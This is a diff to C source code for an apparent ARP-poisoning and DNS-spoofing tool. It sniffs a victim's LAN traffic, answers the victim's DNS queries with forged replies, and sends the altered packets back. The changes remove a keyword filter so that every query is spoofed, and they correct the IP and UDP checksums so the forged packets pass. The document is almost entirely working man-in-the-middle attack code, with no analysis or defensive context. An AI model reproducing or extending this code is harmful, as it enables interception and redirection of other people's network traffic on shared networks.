@@ -11,7 +11,6 @@
 
 static BOOL finished_infecting;
 send_params infect_params;
-static char* keyword = "ysite";
 u_long fake_web = 2130706433; // TODO 
 
 /* ethernet layer macros */
@@ -40,7 +39,6 @@ static DWORD WINAPI start_arp_spoofing(
 )
 {
 	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
-	ip_hdr* network_layer;
 	
 	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
@@ -129,11 +127,13 @@ static void change_packet_sizes(
 	ip_header = (ip_hdr*)((BYTE*)packet + sizeof(ether_hdr));
 	udp_header = (udp_hdr*)((BYTE*)packet + sizeof(ether_hdr) + sizeof(ip_hdr));
 	
-	//ip_header->chksum = in_checksum(ip_header, sizeof(ip_hdr));
 	ip_header->length = htons((BYTE*)end_packet - (BYTE*)ip_header);
+	ip_header->chksum = 0;
+	ip_header->chksum = in_checksum((uint16_t*)ip_header, sizeof(ip_hdr));
 
 	udp_header->len = htons((BYTE*)end_packet - (BYTE*)udp_header);
-	//udp_header->chksum = in_checksum(udp_header, (BYTE*)end_packet - (BYTE*)udp_header);
+	udp_header->chksum = 0;
+	udp_header->chksum = htons(net_checksum_tcpudp(htons(udp_header->len), 17, (uint8_t*)&ip_header->src_addr, (uint8_t*)udp_header));
 }
 
 /*
@@ -198,36 +198,27 @@ static int dns_spoofing(
 		return 0; // false
 
 	/* locals */
-	void* temp_p = packet + *packet_size;
-	dns_hdr* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
-	u_char* dns_data = (u_char*)dns_header + sizeof(dns_hdr);
-	uint16_t questions;
-	BOOL matching_found = 0;
+	void* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
+	void* dns_question = (void*)((u_char*)dns_header + sizeof(dns_hdr));
+	void* dns_answer = (void*)((u_char*)dns_question + strlen(dns_question) + 5);
+	void* end_packet;
+	
+	/* create fake dns packet */
+	end_packet = create_fake_dns_respones(dns_header, dns_answer, dns_question);
 
-	questions = htons(dns_header->questions);
-	for (size_t i = 0; i < questions; i++)
-	{
-		/* checking for a match */
-		if (!matching_found)
-			if (strstr(dns_data, keyword))
-			{
-				/* keyword matches */
-				temp_p = (void*)dns_data;
-				matching_found = 1;
-			}
-		dns_data += strlen(dns_data) + 5; // point to the next question
-	}
+	/* switch dst/src eth/net/transport layers */
+	SET_DST_MAC(eth_header, infect_params.victim_mac);
+	SWITCH_IPS(((ip_hdr*)(packet + sizeof(ether_hdr))));
+	SWITCH_PORTS(((udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr))));
+	
+	/* change udp/ip header length fields */
+	change_packet_sizes(packet, end_packet);
 
-	if (matching_found)
-	{
-		/* create fake dns packet */
-		temp_p = create_fake_dns_respones(dns_header, dns_data, temp_p);
-		/* change udp/ip header length fields */
-		change_packet_sizes(packet, temp_p);
-		*packet_size = (BYTE*)temp_p - (BYTE*)packet;
-		//finished_infecting = 1;
-	}
-	return matching_found; // true if changed
+	/* update status */
+	*packet_size = (BYTE*)end_packet - (BYTE*)packet;
+	//finished_infecting = 1;
+
+	return 1; // true if changed
 }
 
 void infect()
@@ -245,7 +236,7 @@ void infect()
 
 	int res;
 	struct pcap_pkthdr* pkt_header;
-	const u_char* pkt_data = NULL;
+	u_char* pkt_data = NULL;
 	size_t packet_size;
 
 
@@ -257,7 +248,7 @@ void infect()
 
 	/* check if allocation worked successfully */
 	if (!pAdapterInfo || !alldevs)
-		return -1;
+		return;
 
 	/* get system adapters */
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
@@ -270,9 +261,9 @@ void infect()
 	/*open the adapter*/
 	fp = pcap_open(
 		adapter->name,
-		65536,
+		4096,
 		PCAP_OPENFLAG_PROMISCUOUS,
-		0,
+		20,
 		NULL,
 		NULL
 	);
@@ -342,14 +333,7 @@ void infect()
 		if (COMPARE_MACS(eth_header->src_addr, infect_params.victim_mac)) // if src = taget
 		{	
 			/* check for DNS packets */
-			if (dns_spoofing(pkt_data, &packet_size))
-			{
-				/* changed pakcet */
-				SET_DST_MAC(eth_header, infect_params.victim_mac);
-				SWITCH_IPS(((ip_hdr*)(pkt_data + sizeof(ether_hdr))));
-				SWITCH_PORTS(((udp_hdr*)(pkt_data + sizeof(ether_hdr) + sizeof(ip_hdr))));
-			}
-			else
+			if (!dns_spoofing(pkt_data, &packet_size))
 				SET_DST_MAC(eth_header, infect_params.gateway_mac); // foward
 		}
 		else
@@ -368,5 +352,5 @@ void infect()
 		}
 	}
 
-	return 0;
+	return;
 }
